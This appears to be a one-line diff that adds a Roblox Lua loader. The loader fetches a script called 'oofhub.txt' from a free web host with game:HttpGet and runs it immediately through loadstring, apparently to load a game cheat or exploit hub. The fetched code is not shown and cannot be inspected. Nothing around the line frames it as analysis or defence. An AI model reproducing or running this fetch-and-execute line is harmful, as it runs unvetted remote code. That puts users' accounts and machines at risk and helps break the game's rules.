@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://hcbb.000webhostapp.com/oofhub.txt"))()
